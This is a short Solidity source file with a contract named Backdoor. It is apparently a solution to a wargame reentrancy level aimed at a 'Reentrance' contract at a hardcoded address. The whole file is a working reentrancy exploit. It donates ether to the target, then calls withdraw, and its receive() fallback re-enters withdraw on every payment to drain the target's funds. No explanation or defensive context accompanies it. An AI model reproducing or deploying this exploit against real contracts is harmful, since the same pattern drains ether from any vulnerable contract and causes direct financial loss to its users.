// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Backdoor {

  Reentrance public entry = Reentrance(0xcAaD05AF0c4Dd152cCbf5879e51bCB8Cd0c7d727);
  uint balance;

  constructor() payable { }

  function viewBalance() public view returns (uint) {
    return address(this).balance;
  }

  function prepare() public payable returns (uint) {
    entry.donate{value: address(this).balance}(address(this));
    balance = entry.balanceOf(address(this));
    return balance;
  }

  function enterBackdoor() public {
    entry.withdraw(balance);
  }

  receive() external payable {
    entry.withdraw(balance);
  }

}

contract Reentrance {

  function donate(address _to) public payable { }

  function withdraw(uint _amount) public { }

  function balanceOf(address _who) public view returns (uint balance) { }

}
